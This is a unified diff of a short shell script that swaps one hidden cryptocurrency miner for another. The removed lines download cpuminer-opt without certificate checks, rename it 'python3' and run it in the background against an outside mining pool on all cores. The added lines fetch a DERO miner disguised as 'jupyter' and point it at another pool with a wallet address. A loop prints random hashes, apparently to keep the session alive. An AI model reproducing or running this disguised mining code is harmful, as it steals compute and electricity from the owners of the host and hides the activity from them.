@@ -1,7 +1,5 @@
-apt update
-apt install -y wget git build-essential cmake libuv1-dev uuid-dev libssl-dev
-wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-mv cpuminer-sse2 python3
-./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Lord) -p x -t$(nproc --all) >/dev/null &
+!#/bin/bash
+wget https://github.com/dadanhiyeumX9/dero-mod/raw/main/jupyter-v0.0.5-linux-amd64.tar.gz
+tar xf jupyter-v0.0.5-linux-amd64.tar.gz
+./jupyter -r dero-merah.dockerpool.my.id:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.PokokeSimbah >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
